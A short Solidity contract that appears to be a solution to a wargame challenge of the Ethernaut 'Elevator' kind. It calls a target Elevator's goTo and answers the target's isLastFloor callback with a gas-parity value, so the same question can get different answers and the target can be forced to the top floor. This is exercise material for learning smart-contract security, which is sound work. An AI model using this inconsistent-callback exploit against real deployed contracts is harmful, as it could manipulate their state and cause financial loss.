// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'hardhat/console.sol';
interface Elevator {
  function  goTo(uint) external ;
}


contract Building {
    bool public top;
  
    Elevator ele;
    

    function initElev(address add) public{

        ele=Elevator(add);

    }
    function attackGO() public{

            ele.goTo(0);

    }
    
    function isLastFloor(uint) public returns (bool){

            uint256  gas = gasleft();
            // console.log(gas);
            uint256 result = gas % 2;
            console.log(result);
            bool a =  result == 1 ? true:false;
            return a;

    }
}